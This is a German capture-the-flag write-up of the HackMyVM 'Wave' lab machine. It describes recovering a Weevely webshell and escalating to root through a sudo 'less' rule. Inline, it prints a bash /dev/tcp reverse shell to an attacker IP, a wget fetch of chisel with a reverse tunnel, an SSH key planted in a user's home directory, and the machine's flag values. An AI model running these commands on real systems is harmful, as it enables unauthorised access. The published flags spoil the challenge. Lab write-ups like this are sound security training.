# Wave - HackMyVM Writeup

![Wave Icon](Wave.png)

## Übersicht

*   **VM:** Wave
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=wave)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 08. Juni 2025
*   **Original-Writeup:** https://alientec1908.github.io/Wave_HackMyVM_Medium/
*   **Autor:** Ben C.

---

**Disclaimer:**

Dieser Writeup dient ausschließlich zu Bildungszwecken und dokumentiert Techniken, die in einer kontrollierten Testumgebung (HackTheBox/HackMyVM) angewendet wurden. Die Anwendung dieser Techniken auf Systeme, für die keine ausdrückliche Genehmigung vorliegt, ist illegal und ethisch nicht vertretbar. Der Autor und der Ersteller dieses README übernehmen keine Verantwortung für jeglichen Missbrauch der hier beschriebenen Informationen.

---

## Zusammenfassung

Die Box "Wave" kombinierte verschiedene Schwachstellen für einen interessanten Angriffspfad. Nach der initialen Enumeration offener Dienste (SSH, HTTP) wurde ein Nginx-Webserver mit einem offen zugänglichen `/backup`-Verzeichnis entdeckt. Dieses enthielt Backup-Dateien, darunter eine, die als codierte Webshell (Weevely) identifiziert wurde. Durch das Entschlüsseln und Analysieren dieser Datei konnte der Codierungsalgorithmus nachvollzogen und eine funktionierende Webshell über eine passende PHP-Endung (`.php7`) wiederhergestellt werden.

Die Webshell auf `/weevely.php7` ermöglichte eine erste Shell als Benutzer `www-data`. In dieser Shell wurde ein lokal laufender Dienst auf Port 3923 entdeckt, der über einen SSH-Tunnel zugänglich gemacht werden konnte. Dieser Dienst entpuppte sich als ein Dateibrowser-Interface, das das Navigieren im Dateisystem und das Hochladen von Dateien erlaubte.

Durch das Hochladen des eigenen SSH-Public Keys in den `.ssh`-Ordner des Benutzers `angie` (dessen Home-Verzeichnis zugänglich war) konnte ein SSH-Login als `angie` erreicht werden. Als `angie` wurde eine kritische `sudo`-Regel gefunden, die das Ausführen von `/usr/bin/less -F /opt/secret.txt` als Root ohne Passwort erlaubte. Diese `less`-Instanz konnte für die finale Privilegieneskalation zu Root ausgenutzt werden.

## Technische Details

*   **Betriebssystem:** Debian / Linux (basierend auf Nmap-Erkennung und `uname -a` in Shell)
*   **Offene Ports:**
    *   `22/tcp`: SSH (OpenSSH 9.2p1)
    *   `80/tcp`: HTTP (nginx 1.22.1)
    *   `3923/tcp`: Unbekannter Dienst (lokal gebunden)

## Enumeration

1.  **ARP-Scan:** Identifizierung der Ziel-IP (192.168.2.33) im Netzwerk.
2.  **`/etc/hosts` Eintrag:** Hinzufügen von `wave.hmv` zur lokalen hosts-Datei.
3.  **Nmap Scan:** Identifizierung offener Ports 22 (SSH) und 80 (HTTP). Nginx 1.22.1 wurde erkannt. Robots.txt auf Port 80 zeigte Disallow für `/backup`.
4.  **Web Enumeration (Port 80):**
    *   Die Webseite (`/index.html`) zeigte nur "<h3> WAVE </h3>".
    *   Nikto und Gobuster bestätigten das Nginx-Verzeichnislisting auf `/backup/`.
    *   In `/backup/` wurden mehrere Dateien gefunden: `index.bck`, `log.log`, `phptest.bck`, `robots.bck`, `weevely.bck`.

## Initialer Zugriff (www-data Shell via Webshell)

1.  **Weevely Backdoor:** Die Datei `weevely.bck` enthielt codierten PHP-Code. Nach dem Herunterladen und Umbenennen in `.phar` konnte der Inhalt extrahiert werden (`phar extract`). Der extrahierte Code (`x`) enthielt die Logik einer Weevely-Backdoor (XOR-Verschlüsselung, Base64-Kodierung, GZIP-Komprimierung) und den verwendeten Schlüssel (`3ddf0d5c`).
2.  **Webshell Wiederherstellung:** Es wurde vermutet, dass die Datei `weevely.bck` ursprünglich eine andere PHP-Endung hatte. Fuzzing mit `ffuf` und einer Liste gängiger PHP-Erweiterungen gegen `/weevely.FUZZ` zeigte, dass `/weevely.php7` einen 200 OK Status zurückgab.
3.  **Weevely Client Emulation:** Mit Kenntnis des Schlüssels und des Endpunkts (`/weevely.php7`) konnte ein einfaches Python-Skript erstellt werden, das die Weevely-Kommunikation nachbildete (Befehl komprimieren, XORen, Base64-kodieren, in POST-Request mit `prefix` und `suffix` senden).
4.  **Ergebnis:** Durch Senden eines Payloads wie `system("id");` konnte Code als Benutzer `www-data` ausgeführt werden. Eine Reverse Shell wurde mit `sy5tem("bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'");` initiiert und auf Port 4444 des Angreifers empfangen.

## Lateral Movement (www-data -> angie)

1.  **Systemerkundung als `www-data`:** In der `www-data`-Shell wurde nach weiteren Diensten und Informationen gesucht. `ss -altpn` zeigte einen Prozess, der auf `127.0.0.1:3923` lauschte.
2.  **Port Forwarding:** Der `chisel` Client wurde auf das Zielsystem (`/tmp`) hochgeladen (`wget 192.168.2.199:8000/chisel`). Ein Chisel-Server wurde auf der Angreifer-Maschine gestartet (`./chisel server --reverse -p 2525`). Vom Zielsystem (`www-data` Shell) wurde der Client gestartet, um den lokalen Port 3923 auf einen Port des Angreifers umzuleiten (`./chisel client 192.168.2.199:2525 R:8888:127.0.0.1:3923 &`).
3.  **Lokal gebundener Dienst:** Über den Chisel-Tunnel konnte auf der Angreifer-Maschine (`http://192.168.2.199:8888/`) auf das Interface des Dienstes auf Port 3923 zugegriffen werden. Dies war ein Web-basierter Dateibrowser.
4.  **Dateibrowser Schwachstelle:** Das Interface ermöglichte das Navigieren im Dateisystem (auch außerhalb des Web-Roots) sowie das Erstellen von Verzeichnissen und Hochladen von Dateien. Die Home-Verzeichnisse der Benutzer `angie` und `carla` unter `/home/` waren zugänglich (www-data hatte Leseberechtigung auf /home/angie und /home/carla, aber keinen Schreibzugriff über die Shell).
5.  **SSH Key Upload:** Über das Dateibrowser-Interface konnte ein `.ssh`-Verzeichnis im Home-Ordner von `angie` (`/home/angie/`) erstellt werden. Der öffentliche SSH-Schlüssel des Angreifers (`~/.ssh/id_rsa.pub`, kopiert in `authorized_keys`) wurde dann in dieses `.ssh`-Verzeichnis hochgeladen.
6.  **SSH Login als angie:** Mit dem hochgeladenen `authorized_keys` Eintrag konnte sich erfolgreich via SSH als Benutzer `angie` angemeldet werden (`ssh -i ~/.ssh/id_rsa angie@192.168.2.33`).

## Privilegieneskalation (angie -> root)

1.  **Sudo-Regel für angie:** Als Benutzer `angie` wurde `sudo -l` ausgeführt. Die entscheidende `sudo`-Regel erlaubte die Ausführung von `/usr/bin/less -F /opt/secret.txt` als Root ohne Passwort: `(ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt`.
2.  **`less` Sudo Exploit:** Das `less` Binary kann, wenn es mit `sudo` als Root ausgeführt wird und die Option `-F` verwendet wird (die verhindert, dass `less` beendet wird, wenn der Inhalt auf einen Bildschirm passt), ausgenutzt werden, um eine Shell zu erhalten. Innerhalb der `less`-Instanz kann `!` gefolgt von einem Befehl (z.B. `!/bin/sh`) eine Shell mit den Berechtigungen starten, unter denen `less` läuft (in diesem Fall Root). Das Verändern der Terminalgröße (`stty rows 3 columns 8`) zwingt `less` dazu, den Inhalt nicht auf einen Bildschirm passen zu lassen, was die Ausnutzung erleichtert.
3.  **Root Shell:** Durch die Ausführung von `sudo /usr/bin/less -F /opt/secret.txt`, das Ändern der Terminalgröße und die Eingabe von `!/bin/sh` in `less` wurde eine Root-Shell erlangt.

## Finalisierung (Root Shell)

1.  **Root-Zugriff:** In der Root-Shell konnte auf das Root-Verzeichnis zugegriffen werden.
2.  **Root Flag:** Die Datei `root.txt` im `/root`-Verzeichnis wurde gefunden und ihr Inhalt ausgelesen.

## Flags

*   **user.txt:** `HMVIdsEwudDxJDSaue32DJa` (Gefunden über den Dateibrowser unter `/home/angie/user.txt`)
*   **root.txt:** `HMVNVJrewoiu47rewFDSR` (Gefunden unter `/root/root.txt`)

---
